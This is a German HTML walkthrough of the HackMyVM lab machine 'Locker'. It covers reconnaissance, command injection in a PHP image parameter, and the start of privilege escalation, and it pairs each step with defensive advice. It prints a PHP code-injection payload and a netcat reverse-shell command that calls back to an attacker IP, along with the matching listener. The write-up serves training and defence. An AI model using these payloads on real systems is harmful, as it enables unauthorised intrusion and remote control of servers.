@@ -1,0 +1,509 @@
+﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Locker - HackMyVM - Bericht</title> <!-- Title angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Locker - HackMyVM - Easy - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Easy</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Easy' (Grün) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">gcc</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">python3 http.server</div>
+                <div class="tool-item">export</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (RCE)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.112	08:00:27:1e:48:5c	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerksegment nach aktiven Hosts zu durchsuchen, indem ARP-Anfragen gesendet werden. Die Ausgabe zeigt IP-Adressen, zugehörige MAC-Adressen und den Hersteller der Netzwerkkarte (basierend auf der MAC-Adresse).</p>
+            <p class="evaluation">**Bewertung:** Das Zielsystem wurde erfolgreich unter der IP-Adresse `192.168.2.112` identifiziert. Die MAC-Adresse `08:00:27:1e:48:5c` und der Hersteller "PCS Systemtechnik GmbH" deuten stark auf eine VirtualBox-VM hin. Dies ist der erste wichtige Schritt zur weiteren Untersuchung.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Speichern Sie die IP-Adresse `192.168.2.112` für nachfolgende Scans, z.B. in einer Umgebungsvariable (`export IP=192.168.2.112`). Führen Sie als Nächstes Portscans (z.B. mit Nmap) auf diese IP durch.<br>**Empfehlung (Admin):** Kenntnis der im Netzwerk befindlichen Geräte ist wichtig. Die Erkennung durch ARP-Scans ist in lokalen Netzen normal. Netzwerküberwachung und ggf. NAC (Network Access Control) können helfen, unerwünschte Geräte zu identifizieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sV --script nmap-vulners/ 192.168.2.112</span></div>
+                    <pre>Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-06 01:59 CET
+Nmap scan report for locker (<span class="command">192.168.2.112</span>)
+Host is up (0.00013s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+|_http-server-header: nginx/1.14.2
+| vulners:
+|   cpe:/a:nginx:nginx:1.14.2:
+|     	SV:CVE-2022-41742	0.0	https://vulners.com/osv/SV:CVE-2022-41742
+|     	SV:CVE-2022-41741	0.0	https://vulners.com/osv/SV:CVE-2022-41741
+|     	SV:CVE-2021-3618	0.0	https://vulners.com/osv/SV:CVE-2021-3618
+|     	SV:CVE-2022-41742	0.0	https://vulners.com/osv/SV:CVE-2022-41742
+|     	SV:CVE-2022-41741	0.0	https://vulners.com/osv/SV:CVE-2022-41741
+|_    	SV:CVE-2021-3618	0.0	https://vulners.com/osv/SV:CVE-2021-3618
+MAC Address: <span class="command">08:00:27:1E:48:5C (Oracle VirtualBox virtual NIC)</span></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Dieser Nmap-Befehl führt einen Scan auf die Ziel-IP `192.168.2.112` durch. `-sV` versucht, die Version der laufenden Dienste zu ermitteln. `--script nmap-vulners/` (oder genauer: `--script vulners`) nutzt das Nmap Scripting Engine (NSE) Skript `vulners`, um die erkannten Dienstversionen mit der Vulners-Datenbank bekannter Schwachstellen abzugleichen. Standardmäßig scannt Nmap ohne `-p`-Angabe die Top 1000 TCP-Ports.</p>
+            <p class="evaluation">**Bewertung:** Der Scan identifiziert einen offenen Port: TCP Port 80, auf dem ein Nginx-Webserver in der Version 1.14.2 läuft. Das `vulners`-Skript listet einige CVEs (Common Vulnerabilities and Exposures) für diese Nginx-Version auf (CVE-2022-41742, CVE-2022-41741, CVE-2021-3618). Diese beziehen sich jedoch auf spezifische Konfigurations- und Modulprobleme (z.B. im Zusammenhang mit ALPN oder dem Perl-Modul) und haben einen CVSS-Score von 0.0 laut dieser Ausgabe, was auf ein geringes allgemeines Risiko hindeutet, wenn die spezifischen Bedingungen nicht erfüllt sind. Der einzige signifikante offene Port ist Port 80 (HTTP).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Führen Sie einen vollständigen Portscan (`-p-`) durch, um sicherzustellen, dass keine anderen Ports offen sind. Untersuchen Sie den Webdienst auf Port 80 genauer mittels Web-Enumerationstools (Nikto, Gobuster etc.). Behalten Sie die Nginx-Version und die genannten CVEs im Hinterkopf, falls spätere Funde auf relevante Konfigurationen hindeuten.<br>**Empfehlung (Admin):** Halten Sie Nginx auf dem neuesten Stand, auch wenn die hier gelisteten CVEs aktuell als geringfügig eingestuft werden. Überprüfen Sie die Nginx-Konfiguration auf Sicherheit (z.B. unnötige Module deaktivieren, Sicherheitsheader setzen).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.112 -p-</span></div>
+                    <pre>
+PORT   STATE SERVICE VERSION
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.14.2
+MAC Address: <span class="command">08:00:27:1E:48:5C (Oracle VirtualBox virtual NIC)</span>
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.15 ms locker (192.168.2.112)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Dieser Nmap-Befehl führt einen umfassenderen Scan durch:
+*   `-sS`: TCP SYN Scan (Stealth Scan).
+*   `-sC`: Führt Standard-NSE-Skripte aus.
+*   `-T5`: Aggressives Timing (schnell).
+*   `-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute.
+*   `-p-`: Scannt alle 65535 TCP-Ports.</p>
+            <p class="evaluation">**Bewertung:** Der vollständige Portscan bestätigt, dass tatsächlich nur Port 80 (HTTP mit Nginx 1.14.2) offen ist. Die Standard-Skripte liefern keine weiteren kritischen Informationen außer dem Fehlen eines HTML-Titels. Die OS-Erkennung vermutet ein Linux-System (Kernel 4.x/5.x), was konsistent ist. Der einzige Angriffsvektor bleibt der Webserver.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Konzentrieren Sie alle weiteren Bemühungen auf die Untersuchung des Webservers auf Port 80.<br>**Empfehlung (Admin):** Bestätigt, dass die Angriffsfläche auf Netzwerkebene klein ist (nur Port 80). Die Sicherheit hängt nun stark von der Konfiguration und den Inhalten des Webservers ab.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.112</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.112</span>
++ Target Hostname:    <span class="command">192.168.2.112</span>
++ Target Port:        <span class="command">80</span>
++ Start Time:         2022-11-06 01:59:50 (GMT1)
+---------------------------------------------------------------------------
++ Server: <span class="command">nginx/1.14.2</span>
++ <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span>
++ <span class="password">The X-XSS-Protection header is not defined.</span> This header can hint to the user agent to protect against some forms of XSS
++ <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ <span class="password">No CGI Directories found</span> (use '-C all' to force check all possible dirs)
++ 7915 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2022-11-06 02:00:05 (GMT1) (15 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Nikto wird verwendet, um den Webserver auf `192.168.2.112` (Port 80) auf bekannte Schwachstellen, Fehlkonfigurationen und interessante Dateien zu scannen.</p>
+            <p class="evaluation">**Bewertung:** Nikto findet keine schwerwiegenden Schwachstellen oder interessanten Dateien/Verzeichnisse. Die Hauptbefunde sind fehlende HTTP-Sicherheitsheader:
+*   `X-Frame-Options`: Nicht gesetzt, was die Seite anfällig für Clickjacking machen könnte.
+*   `X-XSS-Protection`: Nicht gesetzt (obwohl dieser Header von modernen Browsern weitgehend ignoriert wird zugunsten von `Content-Security-Policy`).
+*   `X-Content-Type-Options`: Nicht gesetzt, was Browser unter Umständen dazu verleiten könnte, Inhalte falsch zu interpretieren (MIME-Sniffing).
+Diese Funde deuten auf eine Standard- oder minimale Nginx-Konfiguration hin, liefern aber keine direkten Angriffspunkte.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Notieren Sie die fehlenden Header für den Bericht. Da Nikto nichts Konkretes findet, setzen Sie die Enumeration mit Tools fort, die nach Verzeichnissen und Dateien suchen (z.B. Gobuster, ffuf).<br>**Empfehlung (Admin):** Implementieren Sie die fehlenden Sicherheitsheader in der Nginx-Konfiguration (z.B. `add_header X-Frame-Options "SAMEORIGIN";`, `add_header X-Content-Type-Options "nosniff";`), um die allgemeine Sicherheit der Webanwendung zu erhöhen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.112" -e -x txt,php,...,zip -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -t 100</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.3
+by J Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     <span class="command">http://192.168.2.112</span>
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.3
+[+] Extensions:              sql,asp,xml,dot,jpg,phtml,wbk,pem,xls,docx,mdb,jpeg,xlsx,tar,html,htm,msi,mui,bat,exe,dll,raw,php,doc,aspx,png,csv,txt,sh,gz,vss,zip,accdb,py,pl,rtf,rar,pub,db,ps1,pdf
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/11/06 02:00:45 Starting gobuster in directory enumeration mode
+
+<span class="command">http://192.168.2.112/index.html</span>           (Status: 200) [Size: 142]
+<span class="command">http://192.168.2.112/1.jpg</span>                (Status: 200) [Size: 45726]
+<span class="command">http://192.168.2.112/2.jpg</span>                (Status: 200) [Size: 66605]
+<span class="command">http://192.168.2.112/3.jpg</span>                (Status: 200) [Size: 62722]
+<span class="command">http://192.168.2.112/locker.php</span>           (Status: 200) [Size: 58]
+
+===============================================================
+2022/11/06 02:01:32 Finished
+===============================================================</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Gobuster wird verwendet, um nach Verzeichnissen und Dateien auf dem Webserver zu suchen. `-u` gibt die Ziel-URL an. `-w` spezifiziert die Wortliste. `-x` definiert eine lange Liste von Dateiendungen, nach denen gesucht werden soll. `-e` sorgt dafür, dass die volle URL angezeigt wird. `-t 100` erhöht die Anzahl der Threads für einen schnelleren Scan.</p>
+            <p class="evaluation">**Bewertung:** Gobuster findet mehrere interessante Ressourcen:
+*   `index.html`: Die Hauptseite (Status 200 OK).
+*   `1.jpg`, `2.jpg`, `3.jpg`: Bilddateien (Status 200 OK).
+*   `locker.php`: Eine PHP-Datei (Status 200 OK). Dies ist der vielversprechendste Fund, da PHP-Dateien oft serverseitige Logik enthalten und potenzielle Angriffsvektoren darstellen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie die gefundenen Dateien:
+    1. Rufen Sie `index.html` im Browser auf oder laden Sie sie mit `curl` herunter, um den Inhalt zu sehen.
+    2. Rufen Sie `locker.php` direkt auf.
+    3. Analysieren Sie, wie die Bilder (`1.jpg`, `2.jpg`, `3.jpg`) verwendet werden (möglicherweise in `index.html` oder `locker.php`).
+    4. Untersuchen Sie `locker.php` auf Parameter oder Schwachstellen.<br>
+**Empfehlung (Admin):** Stellen Sie sicher, dass keine unnötigen Dateien oder Skripte im Web-Root-Verzeichnis liegen. Analysieren Sie den Zweck und die Sicherheit von `locker.php`.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+view-source:http://192.168.2.112/
+<h1>SUPER LOCKER</h1>
+<h3>Use root password to unlock our powers!</h3>
+<p>aAaaaAAaaAaAAaAAaAAaaaA!</p>
+
+<a ref="/locker.php?image=1">Model 1 </a></pre> <span class="comment"><-- Hinweis: `href`, nicht `ref` --></span>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Dies zeigt den Quellcode der `index.html`-Seite (oder zumindest einen relevanten Ausschnitt). Es enthält eine Überschrift, einen Hinweis auf ein "root password" und einen Link zur `locker.php`.</p>
+            <p class="evaluation">**Bewertung:** Der Quellcode bestätigt die Existenz von `locker.php` und zeigt, wie sie aufgerufen wird: über einen Link, der einen GET-Parameter namens `image` verwendet (hier mit dem Wert `1`). Der Text "Use root password to unlock our powers!" und der seltsame String "aAaaaAAaaAaAAaAAaAAaaaA!" könnten Hinweise sein, sind aber vorerst unklar. Der Link enthält einen kleinen Fehler (`ref` statt `href`), aber die URL selbst ist relevant.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Konzentrieren Sie sich auf die `locker.php`-Datei und den `image`-Parameter. Untersuchen Sie, wie die Anwendung auf verschiedene Werte für `image` reagiert. Testen Sie auf gängige Schwachstellen im Zusammenhang mit Datei- oder Parameterbehandlung (z.B. LFI, RFI, Command Injection). Der Hinweis auf das Root-Passwort könnte später relevant werden.<br>**Empfehlung (Admin):** Überprüfen Sie den Code von `locker.php` auf Sicherheitslücken, insbesondere wie der `image`-Parameter verarbeitet wird. Stellen Sie sicher, dass keine sensiblen Informationen oder Funktionen offenbart werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt -u "http://192.168.2.112/locker.php?image=FUZZ" --hh 58</span></div>
+                    <pre> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.2.112/locker.php?image=FUZZ
+Total requests: 951
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000000006:   200        803 L    805 W      61829 Ch    "1"</span>
+<span class="command">000000011:   200        1169 L   1171 W     90035 Ch    "2"</span>
+<span class="command">000000020:   200        1101 L   1103 W     84791 Ch    "3"</span>
+
+Total time: 0.960193
+Processed Requests: 951
+Filtered Requests: 948
+Requests/sec: 990.4253</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wfuzz, ein weiteres Web-Fuzzing-Tool, wird hier verwendet, um den `image`-Parameter in `locker.php` zu fuzzten. `-c` aktiviert die Farbausgabe. `-w .../common.txt` verwendet eine allgemeine Wortliste. `-u "...?image=FUZZ"` definiert die URL, wobei `FUZZ` der Platzhalter für die Payloads aus der Wortliste ist. `--hh 58` weist Wfuzz an, Antworten auszublenden (Hide), deren Anzahl an Zeichen (Chars) genau 58 beträgt. Der Wert 58 wurde wahrscheinlich durch einen vorherigen Testaufruf von `locker.php` ohne oder mit einem ungültigen `image`-Parameter ermittelt (siehe Gobuster-Ausgabe: `locker.php` hatte Size 58).</p>
+            <p class="evaluation">**Bewertung:** Wfuzz findet drei Werte für den `image`-Parameter, die eine andere Antwort (und damit eine andere Größe als 58 Chars) erzeugen: `1`, `2` und `3`. Dies korreliert mit den zuvor gefundenen Bilddateien (`1.jpg`, `2.jpg`, `3.jpg`). Es scheint, dass `locker.php` je nach Wert des `image`-Parameters unterschiedliche Inhalte (vermutlich die entsprechenden Bilder) anzeigt. Es wurden keine anderen funktionierenden Werte aus der `common.txt`-Liste gefunden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Der `image`-Parameter scheint numerische Werte zu erwarten, die sich auf die Bilder beziehen. Testen Sie nun auf Schwachstellen, die durch die Verarbeitung dieses Parameters entstehen könnten. Besonders interessant sind Command Injection oder LFI. Versuchen Sie, Metazeichen oder Befehle im `image`-Parameter zu verwenden (z.B. `;`, `|`, `&&`, `../`).<br>**Empfehlung (Admin):** Validieren und sanitisieren Sie den `image`-Parameter in `locker.php` rigoros. Erlauben Sie nur erwartete Werte (z.B. Zahlen 1, 2, 3) und stellen Sie sicher, dass der Parameter nicht zur Ausführung von Befehlen oder zum Lesen beliebiger Dateien missbraucht werden kann.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+#########################################################################
+192.168.2.112/locker.php?image= <?php system($GET['cmd']); ?>&cmd=id</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Dies ist eine Notiz des Pentesters, die eine potenzielle Schwachstelle oder einen Exploit-Ansatz beschreibt. Es wird vermutet, dass `locker.php` den Wert des `image`-Parameters möglicherweise unsicher einbindet oder ausführt.</p>
+             <p class="evaluation">**Bewertung:** Der vorgeschlagene Payload `<?php system($GET['cmd']); ?>` ist ein Versuch, PHP-Code direkt in den `image`-Parameter einzuschleusen. Wenn die `locker.php`-Datei den `image`-Parameter z.B. in eine `include()`- oder `eval()`-Funktion ohne ausreichende Bereinigung einfügt, könnte dieser Code ausgeführt werden. Der zusätzliche Parameter `&cmd=id` würde dann von dem eingeschleusten Code genutzt, um den `id`-Befehl auszuführen. Dies ist jedoch eine reine Hypothese zu diesem Zeitpunkt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Testen Sie sorgfältig, ob der `image`-Parameter anfällig für Code Injection oder Command Injection ist. Versuchen Sie einfachere Command-Injection-Payloads zuerst, z.B. `locker.php?image=1;id`, `locker.php?image=1|id`, `locker.php?image=1%0aid`. PHP-Code-Injection wie im Beispiel ist weniger wahrscheinlich, aber einen Versuch wert.<br>**Empfehlung (Admin):** Unbedingt den Code von `locker.php` überprüfen und sicherstellen, dass Benutzereingaben niemals direkt ausgeführt oder unsicher eingebunden werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -Iv "http://192.168.2.112"</span></div>
+                     <pre>
+*   Trying 192.168.2.112:80...
+* <span class="password">Connected to 192.168.2.112 (192.168.2.112) port 80 (#0)</span>
+> HEAD / HTTP/1.1
+> Host: 192.168.2.112
+> User-Agent: curl/7.86.0
+> Accept: */*
+>
+* Mark bundle as not supporting multiuse
+< <span class="password">HTTP/1.1 200 OK</span>
+< Server: <span class="command">nginx/1.14.2</span>
+< Date: Sun, 06 Nov 2022 01:32:52 GMT
+< Content-Type: text/html
+< Content-Length: 142
+< Last-Modified: Fri, 22 Jan 2021 09:40:12 GMT
+< Connection: keep-alive
+< ETag: "600a9d7c-8e"
+< Accept-Ranges: bytes
+<
+
+* <span class="password">Connection #0 to host 192.168.2.112 left intact</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Erneuter `curl`-Aufruf mit `-Iv` gegen die Hauptseite (`/`). Dies sendet eine HEAD-Anfrage und zeigt die Header an.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt, dass die Hauptseite mit Status 200 OK erreichbar ist und liefert die Standard-Header des Nginx-Servers zurück. Keine neuen Informationen im Vergleich zu den vorherigen Scans.</p>
+             <p class="recommendation">**Empfehlung (Pentester/Admin):** Keine Aktion erforderlich. Dieser Schritt scheint redundant zu sein.</p>
+
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (RCE)</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Teste: http://192.168.2.112/locker.php?image=;  //hat länger nicht reagiert,was ein Zeichen für Schwäche ist</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Eine Notiz des Pentesters. Es wurde versucht, die URL `http://192.168.2.112/locker.php?image=;` aufzurufen. Das Semikolon (`;`) wird oft verwendet, um Shell-Befehle unter Linux/Unix zu trennen. Der Test zielt darauf ab, eine Command Injection-Schwachstelle zu finden.</p>
+             <p class="evaluation">**Bewertung:** Die Beobachtung, dass die Anfrage "länger nicht reagiert" hat, ist ein sehr gutes Zeichen für den Angreifer! Es deutet stark darauf hin, dass der Server versucht hat, den Teil nach dem Semikolon als Befehl auszuführen. Da kein Befehl angegeben wurde, "hing" der Prozess möglicherweise oder wartete auf weitere Eingaben. Dies ist ein starker Indikator für eine erfolgreiche Command Injection.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie nun, einen tatsächlichen Befehl nach dem Semikolon einzufügen, z.B. `http://192.168.2.112/locker.php?image=;id` oder `http://192.168.2.112/locker.php?image=;whoami`. Noch besser: Versuchen Sie direkt, eine Reverse Shell aufzubauen, z.B. mit `nc`, `bash` oder `python`.<br>**Empfehlung (Admin):** Dringend den Code von `locker.php` überprüfen und die Command Injection-Schwachstelle beheben! Benutzereingaben dürfen niemals ungefiltert zur Befehlsausführung verwendet werden. Funktionen wie `escapeshellarg()` oder `escapeshellcmd()` in PHP können helfen, müssen aber korrekt angewendet werden. Idealerweise sollte die Anwendung so umgestaltet werden, dass keine Shell-Befehle mit Benutzereingaben konstruiert werden müssen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 5656</span></div>
+                     <pre>listening on [any] 5656 ...</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Startet einen Netcat-Listener auf dem Angreifer-System auf Port 5656, um eine eingehende Reverse-Shell-Verbindung zu empfangen.</p>
+             <p class="evaluation">**Bewertung:** Notwendiger Vorbereitungsschritt für den Reverse-Shell-Payload.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Listener ist bereit. Führen Sie nun den Payload zur Verbindungsherstellung auf dem Zielsystem aus.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+view-source:http://192.168.2.114/locker.php?image=;nc -e /bin/bash 192.168.2.156 9001</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Dies zeigt den Payload, der zur Ausnutzung der Command Injection verwendet wird, um eine Reverse Shell zu erhalten. *Hinweis: Die IP-Adressen hier (`192.168.2.114` und `192.168.2.156`) und der Port (`9001`) scheinen nicht mit dem aktuellen Szenario (Ziel: `.112`, Angreifer: `.121`?, Listener: `5656`) übereinzustimmen. Es handelt sich wahrscheinlich um einen Fehler in der Dokumentation oder einen Payload aus einem anderen Test.* Der korrekte Payload, basierend auf dem vorherigen Listener und der Annahme, dass der Angreifer `192.168.2.121` ist, wäre: `http://192.168.2.112/locker.php?image=;nc -e /bin/bash 192.168.2.121 5656` (oder eine URL-kodierte Version davon).</p>
+             <p class="evaluation">**Bewertung:** Der Ansatz ist korrekt: Das Semikolon trennt den harmlosen `image`-Parameterwert vom eigentlichen Befehl. `nc -e /bin/bash [Angreifer-IP] [Listener-Port]` ist ein klassischer Payload, um eine Bash-Shell über Netcat an den Angreifer zurückzuschicken. Voraussetzung ist, dass Netcat auf dem Zielsystem installiert ist und die `-e`-Option unterstützt (was nicht immer der Fall ist).</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie den korrekten Payload mit der IP des Angreifers und dem Listener-Port. Rufen Sie die konstruierte URL im Browser auf oder verwenden Sie `curl`. Falls `nc -e` nicht funktioniert, versuchen Sie alternative Reverse-Shell-Payloads (z.B. mit `bash -i >& /dev/tcp/...`, Python, Perl, PHP).<br>**Empfehlung (Admin):** Command Injection beheben. Egress-Filtering kann helfen, ausgehende Reverse-Shell-Verbindungen zu blockieren.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 5656</span></div>
+                     <pre>listening on [any] 5656 ...
+<span class="password">connect to [192.168.2.121] from (UNKNOWN) [192.168.2.112] 39266</span></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der Netcat-Listener zeigt eine eingehende Verbindung von der Ziel-IP `192.168.2.112`. Die Angreifer-IP scheint `192.168.2.121` zu sein.</p>
+            <p class="evaluation">**Bewertung:** Erfolg! Die Command Injection wurde erfolgreich ausgenutzt, und die Reverse Shell wurde etabliert. Der Angreifer hat nun eine Shell auf dem Zielsystem.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Sie haben initialen Zugriff! Führen Sie sofort `whoami` und `id` aus, um den Benutzerkontext zu bestätigen. Stabilisieren Sie die Shell (z.B. mit Python PTY, `stty raw -echo; fg`). Beginnen Sie mit der lokalen Enumeration zur Privilegieneskalation.<br>**Empfehlung (Admin):** Der Angreifer ist im System. Incident Response Protokoll aktivieren: System isolieren, Logs sichern, Kompromittierung analysieren, Schwachstelle beheben.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@locker:~/html$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+    <span class="command">15884    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign</span>
+     <span class="command">4639     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+   <span class="command">137057     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span>
+     <span class="command">3596     48 -rwsr-sr-x   1 root     root          47184 Jan 10  2019 /usr/sbin/sulogin</span>
+     <span class="command">3890     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount</span>
+       <span class="command">62     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd</span>
+     <span class="command">3415     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp</span>
+       <span class="command">59     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn</span>
+       <span class="command">60     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh</span>
+       <span class="command">63     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd</span>
+     <span class="command">3888     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount</span>
+     <span class="command">3562     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Innerhalb der Reverse Shell als `www-data` wird der `find`-Befehl verwendet, um nach SUID-Binaries zu suchen (`-perm -4000`).</p>
+             <p class="evaluation">**Bewertung:** Die Liste zeigt Standard-SUID-Binaries eines Linux-Systems. Es fällt auf, dass `sudo` und `pkexec` in dieser Liste fehlen, was ungewöhnlich ist, aber vorkommen kann. `su` ist vorhanden. Es sind keine offensichtlich benutzerdefinierten oder ungewöhnlichen SUID-Dateien zu sehen, die einen einfachen Privesc ermöglichen würden.</p>
